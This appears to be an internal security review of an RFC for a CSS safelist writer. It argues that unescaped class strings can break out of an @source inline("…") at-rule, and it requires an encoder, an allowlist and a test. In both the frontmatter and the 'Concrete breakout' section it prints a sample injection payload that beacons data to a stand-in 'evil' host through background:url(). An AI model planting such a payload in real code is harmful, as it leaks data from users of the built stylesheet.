---
rfc: RFC-C-02
lens: security/escape
verdict: survives-with-changes
confidence: 0.74
killer_objection: "emitSafelistCss() is a brand-new file-writing sink that serializes regex-scraped, attacker-influenceable strings into the body of an `@source inline(\"…\")` CSS at-rule which is then @import-ed and compiled — yet the RFC self-certifies §11.3 as 'N/A — no new markup-emitting API.' Unescaped class strings can break out of the inline(\"\") quoting and inject arbitrary CSS / at-rules into the app's compiled stylesheet."
required_changes:
  - "Reclassify §11.3 from 'N/A' to an owned, in-scope guardrail. emitSafelistCss() IS a new markup-emitting (CSS-emitting) sink; the security analysis below must be added to the RFC's Guardrail check."
  - "Specify a mandatory output encoder for emitSafelistCss(): the function MUST escape/validate every extracted token before it is written into `@source inline(\"…\")`. At minimum, reject (or backslash-escape) the double-quote, backslash, newline, and the sequences `*/`, `)`, and any token containing `;`, `{`, `}`, `@`, or `</`. Tokens failing validation are dropped with an onWarning, never emitted verbatim."
  - "Define the inline-string quoting contract explicitly in the API doc: state which quote char wraps the safelist, and that emitted tokens are guaranteed not to contain that quote unescaped. Add a test that feeds a malicious token (e.g. `.setClass('x\") } body{display:none} /*')`) through emitSafelistCss and asserts the output CSS contains no injected rule and no unbalanced quote."
  - "Allowlist, don't denylist, for the safelist body: only tokens matching the Tailwind class grammar (the documented `[:\\w\\-/.@#\\[\\]]` + balanced `[...]` arbitrary-value form, with the arbitrary-value interior itself length-capped and stripped of quote/paren/semicolon) may be written. extractDefaultClasses / extractDirectClasses output is NOT pre-validated today (index.ts:589 captures `[^\"']+`, index.ts:689 permits `@#[]()`), so the writer cannot trust its input."
  - "Add a note that the safelist file is generated, not hand-authored, and is fed to the Tailwind compiler with the app author's privileges; therefore a tainted source file (vendored UI snippet, generated view, monorepo dependency) is a realistic injection vector for a build-time CSS-injection / data-exfil (`background:url()`) payload, not merely a 'cosmetic' bug."
file: product/research/v6/30-verification/V-RFC-C-02-security-escape.md
---

# Verdict: RFC-C-02 — security/escape lens

> You are an ADVERSARY. Your job is to KILL this RFC through the security/escape lens.
> Default to `reject` under uncertainty — a good API cut is cheaper than a bad API shipped.

## Attack

The RFC's own guardrail table (line 283) is where it dies on first contact:

> §11.3 escape-by-default: **N/A** — emits class strings + CSS config, no new markup-emitting API.

This is false, and it is the most dangerous kind of false: a self-certification that tells the Wave-3 panel "nothing to see here, skip the escape lens." `emitSafelistCss()` is the single biggest new sink in Track C, and it emits **CSS source that the Tailwind compiler then processes** with the app author's privileges.

### Failure mode 1 — `@source inline("…")` is an unescaped string sink fed by a regex scraper

Trace the data flow the RFC actually proposes:

1. `emitSafelistCss(sources, outFile, opts)` scans `.ts` files (the RFC says it "scans source, writes a CSS file of `@source inline(\"…\")`", lines 97-100).
2. The class strings come from the existing extractor, which is **pure regex string-scraping**, not parsing. The evidence in the real code:
   - `extractDirectClasses` (index.ts:589): `/\.(setClass|addClass)\s*\(\s*["']([^"']+)["']\s*\)/g` — capture group 2 is `[^"']+`, i.e. **any character except the matching quote**: spaces, `}`, `*/`, `@import`, `url(...)`, `;`, `{` are all legal captures.
   - `extractDefaultClasses` (index.ts:689): `/[:\w\-/.@#[\]]+(?:\([^)]*\))?/g` — deliberately permits `@`, `#`, `[`, `]`, and a trailing `( … )` group. `@import` and `@layer` survive this filter.
3. Those raw tokens are joined and written as the **body of a double-quoted CSS function argument**: `@source inline("bg-linear-to-r p-4 …")`.

Today this is harmless because the extractor returns a `string[]` that Tailwind consumes **internally** — unmatched garbage is silently discarded by the utility generator and **never serialized anywhere**. The RFC changes the consumer from "in-memory matcher that drops non-matches" to "**file writer that emits the bytes verbatim into a CSS at-rule.**" That is, by definition, a new markup-emitting path. The "no new markup-emitting API" claim conflates "the *class strings* are unchanged" with "the *emission* is unchanged" — only the former is true.

Concrete breakout. A source file containing:

```ts
Div().setClass('x") } body{background:url(//evil/?c=)} /*')
```

is captured by index.ts:589 as the token `x") } body{background:url(//evil/?c=)} /*` and, written naively, produces:

```css
@source inline("x") } body{background:url(//evil/?c=)} /*…rest of safelist…");
```

The `"` closes the inline string, `)` closes the function, `}` is irrelevant inside a top-level context but the following `body{ … }` is now a **live CSS rule injected into the compiled stylesheet** — a build-time CSS injection. With `url()` it's a data-exfiltration beacon or, combined with `@import`, a request to an attacker origin baked into every page that loads the stylesheet. The trailing `/*` comments out the rest of the real safelist (a self-DoS that also hides the injection from a glance at the file).

### Failure mode 2 — the threat model is realistic, not theoretical

"But the source is the app author's own code." Not necessarily:
- The extractor runs over `'src/**/*.ts'` globs that routinely include **vendored/generated view files**, copied component snippets, and in this monorepo, **sibling packages** (`ttl`, `rideshare`) whose `setClass` strings the build trusts implicitly.
- A `class="…"` attribute inside a template literal is *also* scooped up by `extractDefaultClasses` (the doc comment at index.ts:686 says so explicitly), so any string that flows into a class attribute — including ones assembled from lower-trust data — becomes a candidate token written to the safelist.
- The output is fed straight to `@tailwindcss/cli`, which runs at build time with full FS/network reach. A poisoned token is a build-time RCE-adjacent primitive (at minimum CSS injection + `@import url()` SSRF from the build host).

### Failure mode 3 — no explicit Raw-equivalent boundary

Guardrail §11.3 requires "Raw-equivalents must be explicit." The RFC introduces an implicit, invisible Raw: every `setClass`/`addClass` string and every arbitrary-value token (`.textSize("[13px]")`, escape-hatch strings, `.opacity("[0.33]")`) becomes raw text inside a CSS sink **with no opt-in and no escaping contract documented**. There is no `emitSafelistCss` analog of the library's explicit `Raw()` boundary; the danger is hidden behind a build script.

## Does it survive?

**survives-with-changes.** It does not reach `reject` because the underlying *design* (single vocabulary, dual-target switch) is sound and the sink is a real, fixable engineering surface — an output encoder + allowlist closes it completely. But it absolutely cannot ship with §11.3 marked "N/A": that mis-certification is itself a guardrail violation (it tells the panel to skip the one lens that catches this), and the un-escaped writer is a credible build-time CSS-injection vector.

The fix is mechanical and cheap, which is exactly why cutting the whole RFC would be the wrong call — but the RFC as written hides a live sink behind a false "N/A," so it must be amended before it survives. Required changes are listed in the frontmatter; the load-bearing ones are (a) reclassify §11.3 as owned and in-scope, (b) mandate an allowlist-based output encoder in `emitSafelistCss()` that drops/escapes any token that can break the `inline("…")` quoting, and (c) ship a breakout test.

## Guardrail check (this lens owns §11.3)

§11.3 escape-by-default — **FAIL as written.** The RFC self-certifies "N/A — no new markup-emitting API," but `emitSafelistCss()` is a new CSS-emitting sink that serializes untrusted, regex-scraped tokens verbatim into an `@source inline("…")` at-rule with no escaping or allowlist. This is an XSS-class (CSS-injection / SSRF-via-`@import url()`) regression introduced by the new file-writing path. The guardrail passes only after the mandated output encoder + allowlist + breakout test are folded into the RFC; until then, escape-by-default is violated and the "N/A" classification must be corrected to an owned, analyzed guardrail.
